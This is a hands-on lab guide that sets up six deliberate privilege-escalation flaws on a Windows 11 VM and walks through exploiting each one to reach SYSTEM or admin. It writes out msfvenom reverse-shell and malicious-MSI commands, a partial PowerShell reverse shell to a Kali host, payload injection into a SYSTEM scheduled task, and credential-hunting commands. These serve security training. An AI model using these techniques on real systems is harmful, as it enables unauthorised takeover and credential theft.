# Lab: Windows Privilege Escalation Playground

## Objective

Set up multiple privilege escalation vectors on your Windows 11 VM and practice identifying and exploiting each one. This is the Windows equivalent of the Linux Privesc Playground lab.

## Prerequisites

- Windows 11 VM running on 192.168.244.x
- Kali Linux (for file serving and reverse shells)
- Admin access to the Windows VM for setup

---

## Setup (run everything as Administrator on Windows 11)

### Create the low-privilege test user

```cmd
net user pentester Pentest123! /add
```

This is the user you'll escalate FROM. Don't add them to any admin groups.

### Download tools to the Windows VM

On Kali, serve your tools:
```bash
mkdir -p ~/win-tools && cd ~/win-tools

# You should have these downloaded already. If not:
# Download WinPEAS, PrintSpoofer, GodPotato, PowerUp.ps1, accesschk.exe
# from their respective GitHub releases

python3 -m http.server 80
```

On Windows (as Administrator), download them:
```cmd
mkdir C:\Tools
cd C:\Tools
certutil -urlcache -f http://KALI_IP/winpeas.exe winpeas.exe
certutil -urlcache -f http://KALI_IP/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://KALI_IP/accesschk.exe accesschk.exe
```

Give the pentester user read access to the tools:
```cmd
icacls C:\Tools /grant pentester:(OI)(CI)RX
```

### Create the flag

```cmd
echo FLAG{windows_privesc_playground_complete} > C:\Users\Administrator\Desktop\flag.txt
icacls C:\Users\Administrator\Desktop\flag.txt /inheritance:r /grant Administrators:F
```

---

## Vector 1: Unquoted Service Path

### Setup (as Administrator)

```cmd
:: Create the directory structure with spaces
mkdir "C:\Program Files\Vulnerable Application\Sub Directory"

:: Copy a legitimate executable there
copy C:\Windows\System32\cmd.exe "C:\Program Files\Vulnerable Application\Sub Directory\service.exe"

:: Create a service with an UNQUOTED path
sc create VulnSvc binPath= "C:\Program Files\Vulnerable Application\Sub Directory\service.exe" start= auto DisplayName= "Vulnerable Service"

:: Make the intermediate directory writable by Everyone
icacls "C:\Program Files\Vulnerable Application" /grant Everyone:(OI)(CI)F
```

### Attack (as pentester)

```cmd
:: Log in as pentester
runas /user:pentester cmd.exe

:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"

:: You see:
:: Vulnerable Service  VulnSvc  C:\Program Files\Vulnerable Application\Sub Directory\service.exe  Auto
:: The path has spaces and NO quotes — vulnerable!

:: Check which directories are writable
icacls "C:\Program Files\Vulnerable Application\"
:: Shows Everyone has Full access

:: Windows will try these paths in order:
:: C:\Program.exe
:: C:\Program Files\Vulnerable.exe                ← we can write here!
:: C:\Program Files\Vulnerable Application\Sub.exe
:: C:\Program Files\Vulnerable Application\Sub Directory\service.exe

:: Place a payload (for this lab, just prove you can place a file)
echo PRIVESC_PROOF > "C:\Program Files\Vulnerable Application\Vulnerable.exe"

:: In a real attack:
:: 1. Generate payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o Vulnerable.exe
:: 2. Copy it: copy Vulnerable.exe "C:\Program Files\Vulnerable Application\Vulnerable.exe"
:: 3. Restart the service: sc stop VulnSvc && sc start VulnSvc
:: 4. Shell arrives at your listener as SYSTEM
```

### Why it works

Windows path resolution with spaces:

```
Path: C:\Program Files\Vulnerable Application\Sub Directory\service.exe

Without quotes, Windows doesn't know where the path ends.
It tries each possible break point:
  "C:\Program.exe" Files\Vulnerable Application\Sub Directory\service.exe
  "C:\Program Files\Vulnerable.exe" Application\Sub Directory\service.exe
  "C:\Program Files\Vulnerable Application\Sub.exe" Directory\service.exe
  "C:\Program Files\Vulnerable Application\Sub Directory\service.exe"

If any earlier path exists, Windows runs THAT instead of the real service.
Since the service runs as SYSTEM, your payload runs as SYSTEM.
```

---

## Vector 2: Weak Service Binary Permissions

### Setup (as Administrator)

```cmd
:: Create a service with a writable binary
mkdir C:\Services
copy C:\Windows\System32\cmd.exe C:\Services\webapp.exe

:: Create the service
sc create WebAppSvc binPath= "C:\Services\webapp.exe" start= auto DisplayName= "Web Application Service"

:: Make the binary writable by Everyone
icacls C:\Services\webapp.exe /grant Everyone:F
```

### Attack (as pentester)

```cmd
:: Find services with writable binaries
:: Check the path of each service
sc qc WebAppSvc
:: BINARY_PATH_NAME: C:\Services\webapp.exe

:: Check if you can write to the binary
icacls C:\Services\webapp.exe
:: Shows Everyone has Full access — you can replace the binary!

:: Replace the binary with your payload
:: In a real attack:
:: copy C:\Tools\shell.exe C:\Services\webapp.exe
:: sc stop WebAppSvc
:: sc start WebAppSvc
:: → shell arrives as SYSTEM

:: For this lab, prove access:
echo REPLACED > C:\Services\webapp_proof.txt
```

---

## Vector 3: AlwaysInstallElevated

### Setup (as Administrator)

```cmd
:: Enable AlwaysInstallElevated (both registry keys must be set)
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```

### Attack (as pentester)

```cmd
:: Check for AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both return 0x1 — vulnerable!

:: Generate a malicious MSI (on Kali):
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi
:: Transfer evil.msi to the Windows machine

:: Install the MSI (runs as SYSTEM because AlwaysInstallElevated)
:: msiexec /quiet /qn /i evil.msi
:: Shell arrives as SYSTEM
```

### Why it works

AlwaysInstallElevated is a Group Policy setting that allows any `.msi` package to install with SYSTEM privileges, regardless of who runs it. Normally, MSI installers run as the current user. With this setting enabled, they run as SYSTEM — so a malicious MSI gives you SYSTEM.

---

## Vector 4: Stored Credentials

### Setup (as Administrator)

```cmd
:: Save credentials for the admin account
cmdkey /add:dc01.corp.local /user:Administrator /pass:P@ssw0rd!
```

### Attack (as pentester)

```cmd
:: Check for stored credentials
cmdkey /list

:: If you see entries:
:: Target: dc01.corp.local
:: User: Administrator

:: Use the stored credentials to run commands as admin
runas /savecred /user:Administrator cmd.exe
:: No password prompt — it uses the stored credential!
:: You now have an admin command prompt

:: Read the flag
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Vector 5: Scheduled Task with Writable Script

### Setup (as Administrator)

```cmd
:: Create a script that runs as SYSTEM
mkdir C:\Tasks
echo @echo off > C:\Tasks\maintenance.bat
echo echo Maintenance ran at %date% %time% >> C:\Tasks\log.txt >> C:\Tasks\maintenance.bat

:: Make it writable by Everyone
icacls C:\Tasks\maintenance.bat /grant Everyone:F

:: Create a scheduled task running every 2 minutes as SYSTEM
schtasks /create /tn "Maintenance" /tr "C:\Tasks\maintenance.bat" /sc minute /mo 2 /ru SYSTEM /f
```

### Attack (as pentester)

```cmd
:: Find scheduled tasks
schtasks /query /fo list /v | findstr /i "task\|run\|folder\|author"

:: Check permissions on the task's script
icacls C:\Tasks\maintenance.bat
:: Shows Everyone has Full control

:: Inject your payload into the script
echo C:\Tools\shell.exe >> C:\Tasks\maintenance.bat

:: Or for a reverse shell:
:: echo powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI_IP',4444);..." >> C:\Tasks\maintenance.bat

:: Wait up to 2 minutes — the task runs as SYSTEM
:: Your payload executes with SYSTEM privileges
```

---

## Vector 6: Credential Hunting

### Setup (as Administrator)

```cmd
:: Create files containing passwords in common locations
echo Database Password: DbAdmin2026! > C:\Users\pentester\Desktop\notes.txt
echo VPN: vpn.corp.local user: admin pass: VpnP@ss! > C:\Users\pentester\Documents\vpn_setup.txt

:: Simulate a PowerShell history with credentials
mkdir C:\Users\pentester\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
echo net user administrator NewP@ssw0rd! > "C:\Users\pentester\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
echo Invoke-WebRequest http://internal/api -Headers @{Authorization="Bearer sk_live_abc123"} >> "C:\Users\pentester\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

:: Put an autologon password in the registry
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "Administrator" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "AutoLogonP@ss!" /f
```

### Attack (as pentester)

```cmd
:: Search for files containing passwords
findstr /si "password" C:\Users\pentester\*.txt C:\Users\pentester\*.ini C:\Users\pentester\*.config
findstr /si "password" C:\Users\pentester\Desktop\*.txt C:\Users\pentester\Documents\*.txt

:: Check PowerShell history
type C:\Users\pentester\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
:: Shows: net user administrator NewP@ssw0rd!
:: The admin changed their password in PowerShell — and it was logged!

:: Check autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "Default"
:: Shows: DefaultUserName = Administrator, DefaultPassword = AutoLogonP@ss!

:: Try the found credentials
runas /user:Administrator cmd.exe
:: Enter: AutoLogonP@ss! (or whichever password you found)
```

---

## Enumeration Checklist (practice this flow)

Log in as `pentester` and run through the entire checklist:

```cmd
:: Step 1: Who am I?
whoami
whoami /priv
whoami /groups

:: Step 2: System info
systeminfo | findstr /i "OS Name\|OS Version\|Hotfix"

:: Step 3: Check token privileges
whoami /priv
:: Look for SeImpersonatePrivilege

:: Step 4: Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"

:: Step 5: Service binary permissions
for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /i /v "system32"') do @echo %a >> C:\temp\services.txt

:: Step 6: AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

:: Step 7: Stored credentials
cmdkey /list

:: Step 8: Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "Default"

:: Step 9: Scheduled tasks
schtasks /query /fo list /v | findstr /i "task name\|run as\|next run"

:: Step 10: Credential hunting
findstr /si "password" C:\Users\%USERNAME%\*.txt C:\Users\%USERNAME%\*.ini C:\Users\%USERNAME%\*.config
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul

:: Step 11: Installed software
wmic product get name,version 2>nul | findstr /i /v "Microsoft\|Windows"

:: Step 12: Run WinPEAS (best automated option)
C:\Tools\winpeas.exe
```

---

## Cleanup

```cmd
:: Run as Administrator

:: Remove vectors
sc delete VulnSvc
sc delete WebAppSvc
schtasks /delete /tn "Maintenance" /f
rmdir /s /q "C:\Program Files\Vulnerable Application"
rmdir /s /q C:\Services
rmdir /s /q C:\Tasks

:: Remove registry keys
reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
reg delete HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f

:: Remove stored credentials
cmdkey /delete:dc01.corp.local

:: Remove user and files
net user pentester /delete
del C:\Users\Administrator\Desktop\flag.txt
rmdir /s /q C:\Tools
```
